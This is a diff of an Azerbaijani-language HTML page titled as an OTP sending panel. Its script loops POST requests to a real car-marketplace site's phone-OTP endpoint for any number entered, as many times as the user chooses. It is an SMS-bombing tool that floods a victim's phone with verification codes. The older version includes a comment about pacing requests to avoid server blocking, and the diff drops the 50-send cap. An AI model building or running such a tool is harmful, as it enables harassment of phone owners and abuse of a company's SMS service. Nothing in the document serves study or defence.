@@ -3,123 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP Göndərici</title>
+    <title>OTP Göndərmə Paneli</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
         }
-        .card {
-            background: white;
+        .container {
+            background: #fff;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            width: 300px;
+            width: 350px;
         }
         h2 {
-            font-size: 18px;
-            margin-bottom: 15px;
+            text-align: center;
             color: #333;
         }
+        .form-group {
+            margin-bottom: 15px;
+        }
         label {
-            font-size: 14px;
-            color: #666;
             display: block;
             margin-bottom: 5px;
+            color: #666;
         }
         input {
             width: 100%;
             padding: 8px;
-            margin-bottom: 12px;
+            box-sizing: border-box;
             border: 1px solid #ccc;
             border-radius: 4px;
-            box-sizing: border-box;
         }
         button {
             width: 100%;
             padding: 10px;
             background-color: #007bff;
-            color: white;
             border: none;
+            color: white;
+            font-size: 16px;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 14px;
         }
         button:hover {
             background-color: #0056b3;
         }
-        #status {
-            margin-top: 10px;
-            font-size: 13px;
-            text-align: center;
+        #log {
+            margin-top: 15px;
+            font-size: 14px;
+            max-height: 150px;
+            overflow-y: auto;
+            background: #eee;
+            padding: 10px;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>OTP Göndərmə Paneli</h2>
-        <label for="phone">Telefon Nömrəsi:</label>
-        <input type="text" id="phone" placeholder="Məs: 501234567">
-
-        <label for="count">Say (Neçə dəfə):</label>
-        <input type="number" id="count" value="1" min="1" max="50">
-
-        <button onclick="startSending()">Göndər</button>
-        <div id="status"></div>
+<div class="container">
+    <h2>OTP Göndər</h2>
+    <div class="form-group">
+        <label for="phone">Telefon nömrəsi:</label>
+        <input type="text" id="phone" placeholder="Məs: 994501234567">
     </div>
+    <div class="form-group">
+        <label for="count">Say (Neçə dəfə):</label>
+        <input type="number" id="count" value="1" min="1">
+    </div>
+    <button onclick="startSending()">Göndər</button>
+    
+    <div id="log"></div>
+</div>
 
-    <script>
-        async function startSending() {
-            const phone = document.getElementById('phone').value.trim();
-            const count = parseInt(document.getElementById('count').value);
-            const statusDiv = document.getElementById('status');
+<script>
+    async function startSending() {
+        const phone = document.getElementById('phone').value.trim();
+        const count = parseInt(document.getElementById('count').value);
+        const logDiv = document.getElementById('log');
+        
+        logDiv.innerHTML = '';
 
-            if (!phone) {
-                statusDiv.style.color = 'red';
-                statusDiv.innerText = 'Zəhmət olmasa nömrə daxil edin!';
-                return;
-            }
-
-            statusDiv.style.color = 'blue';
-            statusDiv.innerText = 'Göndərilir...';
-
-            let successCount = 0;
-
-            for (let i = 0; i < count; i++) {
-                try {
-                    // Qeyd: Brauzerlər arası CORS məhdudiyyətinə görə bu sorğu 
-                    // birbaşa client-side (frontend) işləməyə bilər və server 
-                    // tərəfdən (məsələn, Python ilə) icra olunması tələb oluna bilər.
-                    let response = await fetch('https://www.masin.az/api/auth/send-phone-otp', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({ phone: phone })
-                    });
-
-                    if (response.ok) {
-                        successCount++;
-                    }
-                } catch (error) {
-                    console.error('Xəta:', error);
-                }
-
-                // Sorğular arası kiçik gözləmə (server tərəfindən bloklanmamaq üçün)
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-
-            statusDiv.style.color = 'green';
-            statusDiv.innerText = `Tamamlandı! Uğurlu: ${successCount}/${count}`;
+        if (!phone) {
+            alert('Zəhmət olmasa nömrə daxil edin!');
+            return;
         }
-    </script>
+
+        const url = 'https://www.masin.az/api/auth/send-phone-otp';
+
+        for (let i = 1; i <= count; i++) {
+            try {
+                // API-nin tələb etdiyi məlumat formatına uyğun olaraq body hissəsini dəyişə bilərsiniz
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ phone: phone }) 
+                });
+
+                if (response.ok) {
+                    logDiv.innerHTML += `[${i}] Uğurlu: Kod göndərildi.<br>`;
+                } else {
+                    logDiv.innerHTML += `[${i}] Xəta: Status ${response.status}<br>`;
+                }
+            } catch (error) {
+                logDiv.innerHTML += `[${i}] Bağlantı xətası: ${error.message}<br>`;
+            }
+            
+            // Sorğular arası qısa gözləmə əlavə etmək üçün (istəyə bağlı)
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+    }
+</script>
 
 </body>
 </html>
